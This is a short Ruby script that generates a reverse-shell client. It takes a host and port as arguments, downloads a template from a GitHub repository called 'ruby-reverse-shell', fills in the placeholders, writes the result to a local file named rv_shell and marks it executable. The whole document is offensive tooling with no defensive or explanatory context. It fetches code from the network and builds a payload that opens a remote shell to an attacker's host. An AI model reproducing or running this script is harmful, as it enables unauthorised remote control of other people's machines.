require "net/http"
require "socket"
host = ARGV[0]
port = ARGV[1]

script = Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/Matthiasclee/ruby-reverse-shell/master/client-generator-temp-client-unix.rb")).gsub("<-HOST->", host).gsub("<-PORT->", port)
File.write("./rv_shell", script)
`chmod +x ./rv_shell`
